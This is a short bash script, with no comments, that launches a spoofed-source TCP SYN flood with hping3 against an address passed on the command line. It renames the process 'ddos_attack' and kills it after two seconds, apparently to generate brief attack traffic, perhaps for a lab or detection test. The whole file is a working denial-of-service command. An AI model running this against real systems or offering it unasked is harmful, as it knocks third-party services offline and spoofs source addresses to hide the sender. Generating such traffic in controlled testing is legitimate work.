#!/bin/bash

attack_addr=$1

bash -c "exec -a ddos_attack hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source ${attack_addr} &";

sleep 2;
pkill -f ddos_attack;
